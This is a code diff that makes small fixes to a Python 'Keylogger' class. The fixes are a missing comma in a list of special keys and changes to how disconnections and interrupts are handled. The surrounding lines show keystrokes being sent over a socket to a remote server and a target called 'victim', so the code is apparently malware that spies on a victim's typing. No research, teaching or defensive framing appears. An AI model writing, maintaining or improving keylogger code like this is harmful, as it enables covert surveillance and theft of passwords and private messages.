@@ -19,7 +19,7 @@ class Keylogger():
 
 			"Key.esc", "Key.ctrl", "Key.alt",
 			"Key.shift", "Key.caps_lock", "Key.backspace",
-			"Key.tab", "Key.right", "Key.ctrl_l", "key.alt_l"
+			"Key.tab", "Key.right", "Key.ctrl_l", "key.alt_l",
 			"Key.cmdr", "Key.cmd"
 
 		]
@@ -66,7 +66,7 @@ class Keylogger():
 						
 						self.client.sendall(byte_msg)
 
-				except (ConnectionResetError, BrokenPipeError) as error: 
+				except (ConnectionResetError, BrokenPipeError):
 						
 						print("Server has been disconnected")
 
@@ -74,7 +74,7 @@ class Keylogger():
 						
 						self.client_connect = False
 
-						raise error
+						return False
 				
 
 if __name__ == '__main__':
@@ -90,6 +90,7 @@ if __name__ == '__main__':
 	if victim.fail:
 
 		print("The program is now being terminated")
+		
 		sys.exit(1)
 
 	try:
@@ -98,8 +99,8 @@ if __name__ == '__main__':
 			
 				l.join()
 
-	except (KeyboardInterrupt , ConnectionResetError, BrokenPipeError) as e:
+	except KeyboardInterrupt:
 
-				print(f"Program has been terminated, due to {e}")
+				print("Program has been terminated")
 
 
